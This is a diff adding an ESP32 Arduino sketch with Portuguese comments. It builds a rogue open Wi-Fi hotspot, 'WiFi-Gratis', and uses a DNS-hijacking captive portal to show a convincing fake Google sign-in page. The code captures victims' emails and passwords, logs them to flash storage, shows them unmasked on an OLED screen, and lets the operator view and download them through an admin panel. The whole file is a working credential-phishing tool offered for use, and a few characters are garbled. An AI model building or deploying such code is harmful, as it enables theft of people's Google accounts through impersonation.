@@ -1,0 +1,449 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <SPIFFS.h>
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_RESET -1
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+
+WebServer server(80);
+DNSServer dnsServer;
+
+const byte DNS_PORT = 53;
+const char* ssid = "WiFi-Gratis";
+const char* password = ""; // Senha do AP falso
+
+// Senha administrativa para acessar os logs
+const String adminPassword = "tell@123";
+
+String capturedEmail = "Nenhum email capturado";
+String capturedPassword = "Nenhuma senha capturada";
+int attemptCount = 0;
+bool isAuthenticated = false;
+
+void setup() {
+  Serial.begin(115200);
+  
+  // Inicializar display OLED
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("Falha no display SSD1306"));
+    for(;;);
+  }
+  
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0,0);
+  display.println("Iniciando AP...");
+  display.display();
+  delay(2000);
+
+  // Inicializar SPIFFS
+  if (!SPIFFS.begin(true)) {
+    Serial.println("Falha na inicializacao do SPIFFS!");
+    display.clearDisplay();
+    display.setCursor(0,0);
+    display.println("Erro: SPIFFS");
+    display.display();
+    delay(2000);
+  } else {
+    Serial.println("SPIFFS inicializado com sucesso!");
+    
+    // Criar arquivo de log se não existir
+    File logFile = SPIFFS.open("/log.txt", FILE_APPEND);
+    if (logFile) {
+      logFile.println("=== INICIO DO LOG ===");
+      logFile.close();
+    }
+  }
+
+  // Criar Access Point
+  WiFi.softAP(ssid, password);
+  Serial.println("Access Point criado");
+  Serial.print("IP: ");
+  Serial.println(WiFi.softAPIP());
+
+  // Iniciar servidor DNS para redirecionar todas as requisições
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+
+  // Configurar rotas do servidor para captive portal
+  server.on("/", handleRoot);
+  server.on("/login", handleLogin);
+  server.on("/generate_204", handleRoot);  // Para Android captive portal
+  server.on("/fwlink", handleRoot);        // Para Microsoft captive portal
+  server.on("/hotspot-detect.html", handleRoot); // Para Apple captive portal
+  server.on("/connecttest.txt", handleRoot); // Para Windows
+  server.on("/success.txt", handleRoot); // Para Apple
+  server.on("/ncsi.txt", handleRoot); // Para Windows
+  server.on("/view_logs", handleViewLogs); // Página para visualizar logs
+  server.on("/admin_login", handleAdminLogin); // Login administrativo
+  server.on("/delete_logs", handleDeleteLogs); // Página para deletar logs
+  server.on("/download_logs", handleDownloadLogs); // Download do arquivo de log
+  server.onNotFound(handleNotFound); // Usar handleNotFound para outras requisições
+
+  server.begin();
+  Serial.println("Servidor HTTP e DNS iniciados");
+
+  updateDisplay();
+}
+
+void loop() {
+  dnsServer.processNextRequest(); // Processar requisições DNS
+  server.handleClient(); // Processar requisições HTTP
+}
+
+void handleRoot() {
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<title>Fazer login - Google WiFi</title>";
+  html += "<style>";
+  html += "* { box-sizing: border-box; margin: 0; padding: 0; }";
+  html += "body { font-family: 'Google Sans', Arial, sans-serif; background: #fff; color: #202124; display: flex; justify-content: center; align-items: center; min-height: 100vh; }";
+  html += ".google-container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }";
+  html += ".google-logo { text-align: center; margin-bottom: 20px; }";
+  html += ".google-text { font-family: 'Google Sans', 'Product Sans', Roboto, Arial, sans-serif; font-size: 48px; font-weight: 700; letter-spacing: -1px; margin-bottom: 10px; }";
+  html += ".b { color: #4285F4; } /* azul */";
+  html += ".r { color: #EA4335; } /* vermelho */";
+  html += ".y { color: #FBBC05; } /* amarelo */";
+  html += ".g { color: #34A853; } /* verde */";
+  html += "h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 10px; }";
+  html += "h2 { text-align: center; font-size: 16px; font-weight: 400; margin-bottom: 30px; color: #5f6368; }";
+  html += "input { width: 100%; height: 55px; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; }";
+  html += "input:focus { border: 2px solid #1a73e8; outline: none; }";
+  html += "button { background: #1a73e8; color: white; width: 100%; border: none; border-radius: 4px; padding: 10px 0; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 20px; }";
+  html += "button:hover { background: #1565c0; }";
+  html += ".footer { text-align: center; margin-top: 30px; font-size: 12px; color: #5f6368; }";
+  html += ".footer a { color: #1a73e8; text-decoration: none; }";
+  html += ".footer a:hover { text-decoration: underline; }";
+  html += ".language { text-align: center; margin-top: 20px; font-size: 12px; }";
+  html += ".language a { color: #1a73e8; text-decoration: none; margin: 0 3px; }";
+  html += "</style>";
+  html += "</head><body>";
+  html += "<div class='google-container'>";
+  html += "<div class='google-logo'>";
+  html += "<div class='google-text' aria-label='Google'>";
+  html += "<span class='b'>G</span><span class='r'>o</span><span class='y'>o</span><span class='b'>g</span><span class='g'>l</span><span class='r'>e</span>";
+  html += "</div>";
+  html += "</div>";
+  html += "<h1>Fazer login</h1>";
+  html += "<h2>Use sua Conta do Google</h2>";
+  html += "<form action='/login' method='post'>";
+  html += "<input type='email' name='email' placeholder='E-mail ou telefone' required>";
+  html += "<input type='password' name='password' placeholder='Digite sua senha' required>";
+  html += "<button type='submit'>Próxima</button>";
+  html += "</form>";
+  html += "<div class='footer'>";
+  html += "<p><a href='/view_logs'>Acesso do administrador</a></p>";
+  html += "<p>© 2023 Google. Todos os direitos reservados.</p>";
+  html += "</div>";
+  html += "<div class='language'>";
+  html += "<a href='#'>Português (Brasil)</a> • <a href='#'>English</a> • <a href='#'>Español</a>";
+  html += "</div>";
+  html += "</div>";
+  html += "</body></html>";
+  
+  server.send(200, "text/html; charset=UTF-8", html);
+}
+
+void handleAdminLogin() {
+  if (server.method() == HTTP_POST) {
+    if (server.hasArg("password") && server.arg("password") == adminPassword) {
+      isAuthenticated = true;
+      server.sendHeader("Location", "/view_logs");
+      server.send(302, "text/plain", "Redirecting to admin panel");
+      return;
+    }
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<title>Acesso Administrativo</title>";
+  html += "<style>";
+  html += "body { font-family: 'Google Sans', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }";
+  html += ".admin-container { width: 100%;極ax-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }";
+  html += "h1 { text-align: center; font-size: 24px; margin-bottom: 30px; }";
+  html += "input { width: 100%; height: 55px; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; }";
+  html += "button { background: #1a73e8; color: white; width: 100%; border: none; border-radius: 4px; padding: 10px 0; font-size: 14px; cursor: pointer; }";
+  html += "</style>";
+  html += "</head><body>";
+  html += "<div class='admin-container'>";
+  html += "<h1>Acesso Administrativo</h1>";
+  html += "<form action='/admin_login' method='post'>";
+  html += "<input type='password' name='password' placeholder='Senha administrativa' required>";
+  html += "<button type='submit'>Acessar</button>";
+  html += "</form>";
+  html += "</div>";
+  html += "</body></html>";
+  
+  server.send(200, "text/html; charset=UTF-8", html);
+}
+
+void handleLogin() {
+  if (server.method() == HTTP_POST) {
+    if (server.hasArg("email") && server.hasArg("password")) {
+      capturedEmail = server.arg("email");
+      capturedPassword = server.arg("password");
+      attemptCount++;
+      
+      Serial.print("Email capturado: ");
+      Serial.println(capturedEmail);
+      Serial.print("Senha capturada: ");
+      Serial.println(capturedPassword);
+      Serial.print("Tentativas: ");
+      Serial.println(attemptCount);
+      
+      // Salvar na memória interna (SPIFFS)
+      saveToSPIFFS(capturedEmail, capturedPassword);
+      
+      updateDisplay();
+    }
+  }
+  
+  // Página de sucesso com redirecionamento
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<title>Login bem-sucedido</title>";
+  html += "<style>";
+  html += "body { font-family: 'Google Sans', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }";
+  html += ".success-container { text-align: center; padding: 48px 40px 36px; }";
+  html += "h1 { color: #34A853; font-size: 24px; margin-bottom: 20px; }";
+  html += "p { color: #5f6368; margin-bottom: 30px; }";
+  html += "</style>";
+  html += "<meta http-equiv='refresh' content='5;url=https://google.com'>";
+  html += "</head><body>";
+  html += "<div class='success-container'>";
+  html += "<h1>✅ Login bem-sucedido</h1>";
+  html += "<p>Você será redirecionado para o Google em instantes.</p>";
+  html += "</div>";
+  html += "</body></html>";
+  
+  server.send(200, "text/html; charset=UTF-8", html);
+}
+
+void handleViewLogs() {
+  // Verificar autenticação
+  if (!isAuthenticated) {
+    server.sendHeader("Location", "/admin_login");
+    server.send(302, "text/plain", "Redirecting to login");
+    return;
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<title>Logs do Sistema - Google Admin</title>";
+  html += "<style>";
+  html += "body { font-family: 'Google Sans', Arial, sans-serif; margin: 20px; background: #f8f9fa; }";
+  html += ".admin-header { background: #fff; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }";
+  html += "h1 { color: #1a73e8; margin-bottom: 10px; }";
+  html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }";
+  html += "th, td { padding: 12px; text-align: left; border-bottom: 1px solid #dadce0; }";
+  html += "th { background-color: #1a73e8; color: white; }";
+  html += "tr:hover { background-color: #f8f9fa; }";
+  html += ".btn { padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; margin-right: 10px; display: inline-block; }";
+  html += ".btn-danger { background: #ea4335; color: white; }";
+  html += ".btn-success { background: #34a853; color: white; }";
+  html += ".btn-logout { background: #5f6368; color: white; }";
+  html += "</style>";
+  html += "</head><body>";
+  html += "<div class='admin-header'>";
+  html += "<h1>📊 Logs do Sistema - Google WiFi Admin</h1>";
+  html += "<p>Total de tentativas: " + String(attemptCount) + "</p>";
+  html += "</div>";
+  
+  // Ler e exibir logs da memória
+  File logFile = SPIFFS.open("/log.txt");
+  if (logFile) {
+    html += "<table>";
+    html += "<tr><th>Data/Hora</th><th>Email</th><th>Senha</th></tr>";
+    
+    // Pular linha de cabeçalho
+    logFile.readStringUntil('\n');
+    
+    while (logFile.available()) {
+      String line = logFile.readStringUntil('\n');
+      if (line.length() > 0 && !line.startsWith("===")) {
+        int firstComma = line.indexOf(',');
+        int secondComma = line.indexOf(',', firstComma + 1);
+        
+        if (firstComma != -1 && secondComma != -1) {
+          String dateTime = line.substring(0, firstComma);
+          String email = line.substring(firstComma + 1, secondComma);
+          String password = line.substring(secondComma + 1);
+          
+          html += "<tr>";
+          html += "<td>" + dateTime + "</td>";
+          html += "<td>" + email + "</td>";
+          html += "<td>" + password + "</td>";
+          html += "</tr>";
+        }
+      }
+    }
+    
+    html += "</table>";
+    logFile.close();
+  } else {
+    html += "<p>Nenhum log encontrado.</p>";
+  }
+  
+  html += "<br>";
+  html += "<a href='/download_logs' class='btn btn-success'>📥 Download Logs</a>";
+  html += "<a href='/delete_logs' class='btn btn-danger'>🗑️ Deletar Logs</a>";
+  html += "<a href='/logout' class='btn btn-logout'>🚪 Sair</a>";
+  html += "<br><br><a href='/'>Voltar ao Portal</a>";
+  html += "</body></html>";
+  
+  server.send(200, "text/html; charset=UTF-8", html);
+}
+
+void handleDeleteLogs() {
+  // Verificar autenticação
+  if (!isAuthenticated) {
+    server.sendHeader("Location", "/admin_login");
+    server.send(302, "text/plain", "Redirecting to login");
+    return;
+  }
+  
+  if (SPIFFS.remove("/log.txt")) {
+    // Recriar arquivo vazio
+    File logFile = SPIFFS.open("/log.txt", FILE_APPEND);
+    if (logFile) {
+      logFile.println("=== INICIO DO LOG ===");
+      logFile.close();
+    }
+    
+    attemptCount = 0;
+    capturedEmail = "Nenhum email capturado";
+    capturedPassword = "Nenhuma senha capturada";
+    
+    String html = "<!DOCTYPE html><html><head>";
+    html += "<meta charset='UTF-8'>";
+    html += "<meta http-equiv='refresh' content='3;極rl=/view_logs'>";
+    html += "<style>body { font-family: 'Google Sans', Arial; text-align: center; margin-top: 100px; }</style>";
+    html += "</head><body>";
+    html += "<h2 style='color:#34A853;'>✅ Logs deletados com sucesso!</h2>";
+    html += "<p>Redirecionando em 3 segundos...</p>";
+    html += "</body></html>";
+    
+    server.send(200, "text/html; charset=UTF-8", html);
+  } else {
+    server.send(500, "text/plain", "Erro ao deletar logs");
+  }
+}
+
+void handleDownloadLogs() {
+  // Verificar autenticação
+  if (!isAuthenticated) {
+    server.sendHeader("Location", "/admin_login");
+    server.send(302, "text/plain", "Redirecting to login");
+    return;
+  }
+  
+  File logFile = SPIFFS.open("/log.txt");
+  if (logFile) {
+    server.sendHeader("Content-Type", "text/plain");
+    server.sendHeader("Content-Disposition", "attachment; filename=google_wifi_logs.txt");
+    server.streamFile(logFile, "text/plain");
+    logFile.close();
+  } else {
+    server.send(404, "text/plain", "Arquivo de log não encontrado");
+  }
+}
+
+void handleNotFound() {
+  // Para outras requisições, redirecionar para a página principal
+  server.sendHeader("Location", "http://192.168.4.1/");
+  server.send(302, "text/plain", "Redirecting...");
+}
+
+void saveToSPIFFS(String email, String password) {
+  File logFile = SPIFFS.open("/log.txt", FILE_APPEND);
+  if (logFile) {
+    // Obter data e hora atual
+    String dateTime = getDateTime();
+    
+    logFile.print(dateTime);
+    logFile.print(",");
+    logFile.print(email);
+    logFile.print(",");
+    logFile.println(password);
+    
+    logFile.close();
+    Serial.println("Dados salvos na memoria SPIFFS");
+  } else {
+    Serial.println("Erro ao abrir arquivo para gravacao");
+  }
+}
+
+String getDateTime() {
+  // Obter tempo desde que a ESP foi ligada
+  unsigned long currentMillis = millis();
+  
+  long seconds = currentMillis / 1000;
+  long minutes = seconds / 60;
+  long hours = minutes / 60;
+  long days = hours / 24;
+  
+  hours = hours % 24;
+  minutes = minutes % 60;
+  seconds = seconds % 60;
+  
+  String dateTime = "Dia ";
+  dateTime += String(days + 1);
+  dateTime += " - ";
+  dateTime += String(hours);
+  dateTime += ":";
+  if (minutes < 10) dateTime += "0";
+  dateTime += String(minutes);
+  dateTime += ":";
+  if (seconds < 10) dateTime += "0";
+  dateTime += String(seconds);
+  
+  return dateTime;
+}
+
+void updateDisplay() {
+  display.clearDisplay();
+  display.setCursor(0,0);
+  
+  display.println("AP: WiFi-Gratis");
+  display.println("IP: 192.168.4.1");
+  display.println("---------------");
+  display.print("Tentativas: ");
+  display.println(attemptCount);
+  
+  if (capturedEmail != "Nenhum email capturado") {
+    display.println("Email:");
+    
+    // Mostrar email completo sem mascaramento
+    if (capturedEmail.length() > 16) {
+      display.println(capturedEmail.substring(0, 16));
+      display.println(capturedEmail.substring(16));
+    } else {
+      display.println(capturedEmail);
+    }
+  }
+  
+  if (capturedPassword != "Nenhuma senha capturada") {
+    display.println("Senha:");
+    
+    // Mostrar senha completa sem mascaramento
+    if (capturedPassword.length() > 16) {
+      display.println(capturedPassword.substring(0, 16));
+      display.println(capturedPassword.substring(16));
+    } else {
+      display.println(capturedPassword);
+    }
+  }
+  
+  display.display();
+  delay(1000);
+}
